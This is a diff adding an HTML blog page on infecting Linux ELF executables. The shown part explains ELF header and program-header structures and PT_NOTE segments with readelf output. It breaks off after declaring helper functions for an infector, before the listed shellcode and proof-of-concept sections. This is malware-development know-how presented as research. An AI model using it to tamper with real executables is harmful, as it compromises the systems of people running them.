@@ -1,0 +1,1047 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Infecting Elf Files | Stephan Bridger</title>
+<meta name="keywords" content="ELF, linux, research, development">
+<meta name="description" content="Elfland
+Lately I&rsquo;ve been thinking about Linux internals and malware. In this blog post, we&rsquo;re going to hark about the ELFs. Just as Windows has its own executable format, so too does Linux.
+If we look at the source code in glibc&rsquo;s elf.h file, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works.
+typedef struct elf64_hdr {
+  unsigned char e_ident[EI_NIDENT]; /* ELF &#34;magic number&#34; */
+  Elf64_Half e_type;
+  Elf64_Half e_machine;
+  Elf64_Word e_version;
+  Elf64_Addr e_entry;       /* Entry point virtual address */
+  Elf64_Off e_phoff;        /* Program header table file offset */
+  Elf64_Off e_shoff;        /* Section header table file offset */
+  Elf64_Word e_flags;
+  Elf64_Half e_ehsize;
+  Elf64_Half e_phentsize;
+  Elf64_Half e_phnum;
+  Elf64_Half e_shentsize;
+  Elf64_Half e_shnum;
+  Elf64_Half e_shstrndx;
+} Elf64_Ehdr;
+
+/* These constants define the permissions on sections in the program
+   header, p_flags. */
+#define PF_R        0x4
+#define PF_W        0x2
+#define PF_X        0x1
+
+
+typedef struct elf64_phdr {
+  Elf64_Word p_type;
+  Elf64_Word p_flags;
+  Elf64_Off p_offset;       /* Segment file offset */
+  Elf64_Addr p_vaddr;       /* Segment virtual address */
+  Elf64_Addr p_paddr;       /* Segment physical address */
+  Elf64_Xword p_filesz;     /* Segment size in file */
+  Elf64_Xword p_memsz;      /* Segment size in memory */
+  Elf64_Xword p_align;      /* Segment alignment, file &amp; memory */
+} Elf64_Phdr;
+
+typedef struct elf64_shdr {
+  Elf64_Word sh_name;       /* Section name, index in string tbl */
+  Elf64_Word sh_type;       /* Type of section */
+  Elf64_Xword sh_flags;     /* Miscellaneous section attributes */
+  Elf64_Addr sh_addr;       /* Section virtual addr at execution */
+  Elf64_Off sh_offset;      /* Section file offset */
+  Elf64_Xword sh_size;      /* Size of section in bytes */
+  Elf64_Word sh_link;       /* Index of another section */
+  Elf64_Word sh_info;       /* Additional section information */
+  Elf64_Xword sh_addralign; /* Section alignment */
+  Elf64_Xword sh_entsize;   /* Entry size if section holds table */
+} Elf64_Shdr;
+
+
+typedef struct elf64_note {
+  Elf64_Word n_namesz;  /* Name size */
+  Elf64_Word n_descsz;  /* Content size */
+  Elf64_Word n_type;    /* Content type */
+} Elf64_Nhdr;
+&ldquo;OK, so what?&rdquo; We&rsquo;re interested in how ELFs work. It turns out they basically use a lookup table. The offset to the program header table is located via e_phoff.">
+<meta name="author" content="Stephan Bridger">
+<link rel="canonical" href="http://localhost:1313/posts/infecting-elf-files/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.559f67c5976d3bc1fda2671c59c682ca226dab0986d6f2261b4ad1d9c4154394.css" integrity="sha256-VZ9nxZdtO8H9omccWcaCyiJtqwmG1vImG0rR2cQVQ5Q=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/infecting-elf-files/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Stephan Bridger (Alt + H)">Stephan Bridger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/newsletter/" title="Newsletter">
+                    <span>Newsletter</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archive/" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Infecting Elf Files
+    </h1>
+    <div class="post-meta"><span title='2025-02-23 00:00:00 +0000 UTC'>February 23, 2025</span>&nbsp;·&nbsp;19 min&nbsp;·&nbsp;3906 words&nbsp;·&nbsp;Stephan Bridger
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#elfland" aria-label="Elfland">Elfland</a></li>
+                <li>
+                    <a href="#constructing-an-infector" aria-label="Constructing an Infector">Constructing an Infector</a></li>
+                <li>
+                    <a href="#assembling-shellcode" aria-label="Assembling Shellcode">Assembling Shellcode</a></li>
+                <li>
+                    <a href="#proof-of-concept" aria-label="Proof of Concept">Proof of Concept</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="elfland">Elfland<a hidden class="anchor" aria-hidden="true" href="#elfland">#</a></h2>
+<p>Lately I&rsquo;ve been thinking about Linux internals and malware. In this blog post, we&rsquo;re going to hark about the ELFs. Just as Windows has its own <a href="https://www.stephan.onl/2023/08/portable-executable-format-and.html">executable format</a>, so too does Linux.</p>
+<p>If we look at the source code in glibc&rsquo;s <code>elf.h</code> file, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">elf64_hdr</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">e_ident</span><span class="p">[</span><span class="n">EI_NIDENT</span><span class="p">];</span> <span class="cm">/* ELF &#34;magic number&#34; */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Half</span> <span class="n">e_type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Half</span> <span class="n">e_machine</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">e_version</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Addr</span> <span class="n">e_entry</span><span class="p">;</span>       <span class="cm">/* Entry point virtual address */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Off</span> <span class="n">e_phoff</span><span class="p">;</span>        <span class="cm">/* Program header table file offset */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Off</span> <span class="n">e_shoff</span><span class="p">;</span>        <span class="cm">/* Section header table file offset */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">e_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Half</span> <span class="n">e_ehsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Half</span> <span class="n">e_phentsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Half</span> <span class="n">e_phnum</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Half</span> <span class="n">e_shentsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Half</span> <span class="n">e_shnum</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Half</span> <span class="n">e_shstrndx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">Elf64_Ehdr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* These constants define the permissions on sections in the program
+</span></span></span><span class="line"><span class="cl"><span class="cm">   header, p_flags. */</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define PF_R        0x4
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define PF_W        0x2
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define PF_X        0x1
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">elf64_phdr</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">p_type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">p_flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Off</span> <span class="n">p_offset</span><span class="p">;</span>       <span class="cm">/* Segment file offset */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Addr</span> <span class="n">p_vaddr</span><span class="p">;</span>       <span class="cm">/* Segment virtual address */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Addr</span> <span class="n">p_paddr</span><span class="p">;</span>       <span class="cm">/* Segment physical address */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Xword</span> <span class="n">p_filesz</span><span class="p">;</span>     <span class="cm">/* Segment size in file */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Xword</span> <span class="n">p_memsz</span><span class="p">;</span>      <span class="cm">/* Segment size in memory */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Xword</span> <span class="n">p_align</span><span class="p">;</span>      <span class="cm">/* Segment alignment, file &amp; memory */</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">Elf64_Phdr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">elf64_shdr</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">sh_name</span><span class="p">;</span>       <span class="cm">/* Section name, index in string tbl */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">sh_type</span><span class="p">;</span>       <span class="cm">/* Type of section */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Xword</span> <span class="n">sh_flags</span><span class="p">;</span>     <span class="cm">/* Miscellaneous section attributes */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Addr</span> <span class="n">sh_addr</span><span class="p">;</span>       <span class="cm">/* Section virtual addr at execution */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Off</span> <span class="n">sh_offset</span><span class="p">;</span>      <span class="cm">/* Section file offset */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Xword</span> <span class="n">sh_size</span><span class="p">;</span>      <span class="cm">/* Size of section in bytes */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">sh_link</span><span class="p">;</span>       <span class="cm">/* Index of another section */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">sh_info</span><span class="p">;</span>       <span class="cm">/* Additional section information */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Xword</span> <span class="n">sh_addralign</span><span class="p">;</span> <span class="cm">/* Section alignment */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Xword</span> <span class="n">sh_entsize</span><span class="p">;</span>   <span class="cm">/* Entry size if section holds table */</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">Elf64_Shdr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">elf64_note</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">n_namesz</span><span class="p">;</span>  <span class="cm">/* Name size */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">n_descsz</span><span class="p">;</span>  <span class="cm">/* Content size */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">n_type</span><span class="p">;</span>    <span class="cm">/* Content type */</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">Elf64_Nhdr</span><span class="p">;</span>
+</span></span></code></pre></div><p>&ldquo;OK, so what?&rdquo; We&rsquo;re interested in how ELFs work. It turns out they basically use a lookup table. The offset to the program header table is located via <code>e_phoff</code>.</p>
+<p>The program header table holds a lot of information. What&rsquo;s important here is that the table controls what values should or shouldn&rsquo;t be loaded into memory at runtime. When an ELF file is executed, it gets mapped by <code>mmap</code> according to the addresses specified in the ELF file program headers. If a program header section section is marked <code>PT_LOAD</code>, it gets mapped.</p>
+<p>For each program header section, the <code>p_type</code> field tells the kernel how to interpret the header. For reference: <code>p_types</code> and their values:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">PT_NULL = 0
+</span></span><span class="line"><span class="cl">PT_LOAD = 1
+</span></span><span class="line"><span class="cl">PT_DYNAMIC = 2
+</span></span><span class="line"><span class="cl">PT_INTERP = 3
+</span></span><span class="line"><span class="cl">PT_NOTE = 4
+</span></span><span class="line"><span class="cl">PT_SHLIB = 5
+</span></span><span class="line"><span class="cl">PT_PHDR = 6
+</span></span><span class="line"><span class="cl">PT_LOPROC = 0x70000000
+</span></span><span class="line"><span class="cl">PT_HIPROC = 0x7fffffff`
+</span></span></code></pre></div><p>For example, the <code>PT_DYNAMIC</code> field specifies dynamic linking information. And all sections marked as <code>LOAD</code> specify loadable segments described by the <code>p_filesz</code> and <code>p_memsz</code> fields of each program header. If we use <code>readelf</code> with the <code>-l</code> flag, we can see the headers with each of their respective permission <code>Flags</code>: <code>read</code>, <code>write</code>, or <code>executable</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">$ readelf -l /usr/bin/ls
+</span></span><span class="line"><span class="cl">Elf file type is DYN (Position-Independent Executable file)
+</span></span><span class="line"><span class="cl">Entry point 0x6d30
+</span></span><span class="line"><span class="cl">There are 13 program headers, starting at offset 64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Program Headers:
+</span></span><span class="line"><span class="cl">  Type           Offset             VirtAddr           PhysAddr
+</span></span><span class="line"><span class="cl">                 FileSiz            MemSiz              Flags  Align
+</span></span><span class="line"><span class="cl">  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
+</span></span><span class="line"><span class="cl">                 0x00000000000002d8 0x00000000000002d8  R      0x8
+</span></span><span class="line"><span class="cl">  INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
+</span></span><span class="line"><span class="cl">                 0x000000000000001c 0x000000000000001c  R      0x1
+</span></span><span class="line"><span class="cl">      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
+</span></span><span class="line"><span class="cl">  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class="line"><span class="cl">                 0x00000000000036f8 0x00000000000036f8  R      0x1000
+</span></span><span class="line"><span class="cl">  LOAD           0x0000000000004000 0x0000000000004000 0x0000000000004000
+</span></span><span class="line"><span class="cl">                 0x0000000000014db1 0x0000000000014db1  R E    0x1000
+</span></span><span class="line"><span class="cl">  LOAD           0x0000000000019000 0x0000000000019000 0x0000000000019000
+</span></span><span class="line"><span class="cl">                 0x00000000000071b8 0x00000000000071b8  R      0x1000
+</span></span><span class="line"><span class="cl">  LOAD           0x0000000000020f30 0x0000000000021f30 0x0000000000021f30
+</span></span><span class="line"><span class="cl">                 0x0000000000001348 0x00000000000025e8  RW     0x1000
+</span></span><span class="line"><span class="cl">  DYNAMIC        0x0000000000021a38 0x0000000000022a38 0x0000000000022a38
+</span></span><span class="line"><span class="cl">                 0x0000000000000200 0x0000000000000200  RW     0x8
+</span></span><span class="line"><span class="cl">  NOTE           0x0000000000000338 0x0000000000000338 0x0000000000000338
+</span></span><span class="line"><span class="cl">                 0x0000000000000030 0x0000000000000030  R      0x8
+</span></span><span class="line"><span class="cl">  NOTE           0x0000000000000368 0x0000000000000368 0x0000000000000368
+</span></span><span class="line"><span class="cl">                 0x0000000000000044 0x0000000000000044  R      0x4
+</span></span><span class="line"><span class="cl">  GNU_PROPERTY   0x0000000000000338 0x0000000000000338 0x0000000000000338
+</span></span><span class="line"><span class="cl">                 0x0000000000000030 0x0000000000000030  R      0x8
+</span></span><span class="line"><span class="cl">  GNU_EH_FRAME   0x000000000001e170 0x000000000001e170 0x000000000001e170
+</span></span><span class="line"><span class="cl">                 0x00000000000005ec 0x00000000000005ec  R      0x4
+</span></span><span class="line"><span class="cl">  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class="line"><span class="cl">                 0x0000000000000000 0x0000000000000000  RW     0x10
+</span></span><span class="line"><span class="cl">  GNU_RELRO      0x0000000000020f30 0x0000000000021f30 0x0000000000021f30
+</span></span><span class="line"><span class="cl">                 0x00000000000010d0 0x00000000000010d0  R      0x1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Section to Segment mapping:
+</span></span><span class="line"><span class="cl">  Segment Sections...
+</span></span><span class="line"><span class="cl">   00     
+</span></span><span class="line"><span class="cl">   01     .interp 
+</span></span><span class="line"><span class="cl">   02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 
+</span></span><span class="line"><span class="cl">   03     .init .plt .plt.got .plt.sec .text .fini 
+</span></span><span class="line"><span class="cl">   04     .rodata .eh_frame_hdr .eh_frame 
+</span></span><span class="line"><span class="cl">   05     .init_array .fini_array .data.rel.ro .dynamic .got .data .bss 
+</span></span><span class="line"><span class="cl">   06     .dynamic 
+</span></span><span class="line"><span class="cl">   07     .note.gnu.property 
+</span></span><span class="line"><span class="cl">   08     .note.gnu.build-id .note.ABI-tag 
+</span></span><span class="line"><span class="cl">   09     .note.gnu.property 
+</span></span><span class="line"><span class="cl">   10     .eh_frame_hdr 
+</span></span><span class="line"><span class="cl">   11     
+</span></span><span class="line"><span class="cl">   12     .init_array .fini_array .data.rel.ro .dynamic .got 
+</span></span></code></pre></div><p>The program header section we&rsquo;re interested in is the <code>NOTE</code> section. As you can see above, this particular section is not intended to be executable. The <code>PT_NOTE</code> segment specifies an auxiliary field for storing information. We can see its construction here.</p>
+<p>For example, a software vendor might desire to mark an executable with information to indicate remarks about compatibility. Together, the <code>PT_NOTE</code> section consists of an array of 4-byte words.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cm">/* Note header in a PT_NOTE section */</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">elf64_note</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">n_namesz</span><span class="p">;</span>  <span class="cm">/* Name size */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">n_descsz</span><span class="p">;</span>  <span class="cm">/* Content size */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Elf64_Word</span> <span class="n">n_type</span><span class="p">;</span>    <span class="cm">/* Content type */</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">Elf64_Nhdr</span><span class="p">;</span>
+</span></span></code></pre></div><p>The sizes for all of the ELF&rsquo;s corresponding types and sizes can be found in glibc&rsquo;s <code>elf.h</code> <a href="https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/elf/elf.h">source on Elixir</a>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cm">/* Standard ELF types.  */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cm">/* Type for a 16-bit quantity.  */</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint16_t</span> <span class="n">Elf32_Half</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint16_t</span> <span class="n">Elf64_Half</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* Types for signed and unsigned 32-bit quantities.  */</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint32_t</span> <span class="n">Elf32_Word</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">int32_t</span>  <span class="n">Elf32_Sword</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint32_t</span> <span class="n">Elf64_Word</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">int32_t</span>  <span class="n">Elf64_Sword</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* Types for signed and unsigned 64-bit quantities.  */</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint64_t</span> <span class="n">Elf32_Xword</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">int64_t</span>  <span class="n">Elf32_Sxword</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint64_t</span> <span class="n">Elf64_Xword</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">int64_t</span>  <span class="n">Elf64_Sxword</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* Type of addresses.  */</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint32_t</span> <span class="n">Elf32_Addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint64_t</span> <span class="n">Elf64_Addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* Type of file offsets.  */</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint32_t</span> <span class="n">Elf32_Off</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint64_t</span> <span class="n">Elf64_Off</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* Type for section indices, which are 16-bit quantities.  */</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint16_t</span> <span class="n">Elf32_Section</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">uint16_t</span> <span class="n">Elf64_Section</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* Type for version symbol information.  */</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="n">Elf32_Half</span> <span class="n">Elf32_Versym</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="n">Elf64_Half</span> <span class="n">Elf64_Versym</span><span class="p">;</span>
+</span></span></code></pre></div><p>If we want to see the <code>PT_NOTE</code> or <code>SHT_NOTE</code> segments of ELF binaries for ourselves, we can glean them using the <code>readelf</code> utility with the <code>-n</code> or <code>--notes</code> flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">$ readelf -n /usr/bin/ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Displaying notes found in: .note.gnu.property
+</span></span><span class="line"><span class="cl">  Owner                Data size    Description
+</span></span><span class="line"><span class="cl">  GNU                  0x00000020   NT_GNU_PROPERTY_TYPE_0
+</span></span><span class="line"><span class="cl">      Properties: x86 feature: IBT, SHSTK
+</span></span><span class="line"><span class="cl">    x86 ISA needed: x86-64-baseline
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Displaying notes found in: .note.gnu.build-id
+</span></span><span class="line"><span class="cl">  Owner                Data size    Description
+</span></span><span class="line"><span class="cl">  GNU                  0x00000014   NT_GNU_BUILD_ID (unique build ID bitstring)
+</span></span><span class="line"><span class="cl">    Build ID: 3eca7e3905b37d48cf0a88b576faa7b95cc3097b
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Displaying notes found in: .note.ABI-tag
+</span></span><span class="line"><span class="cl">  Owner                Data size    Description
+</span></span><span class="line"><span class="cl">  GNU                  0x00000010   NT_GNU_ABI_TAG (ABI version tag)
+</span></span><span class="line"><span class="cl">    OS: Linux, ABI: 3.2.0
+</span></span></code></pre></div><h2 id="constructing-an-infector">Constructing an Infector<a hidden class="anchor" aria-hidden="true" href="#constructing-an-infector">#</a></h2>
+<p>Now that we have a better idea about how ELF files are structured and operate, we can elaborate and clarify our objectives with a bit more precision than before. What do we want to do?</p>
+<p>Before we can do this, we need to set some declarations based on the ELF structure so that have gadgets to do reads and writes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">Elf64_Ehdr</span><span class="o">*</span> <span class="nf">read_elf64_header</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Elf64_Phdr</span><span class="o">*</span> <span class="nf">read_elf64_program_headers</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">phoff</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">phnum</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">write_elf64_program_headers</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">phoff</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">phnum</span><span class="p">,</span> <span class="n">Elf64_Phdr</span> <span class="o">*</span><span class="n">phdrs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">write_elf64_header</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">Elf64_Ehdr</span> <span class="o">*</span><span class="n">header</span><span class="p">);</span>
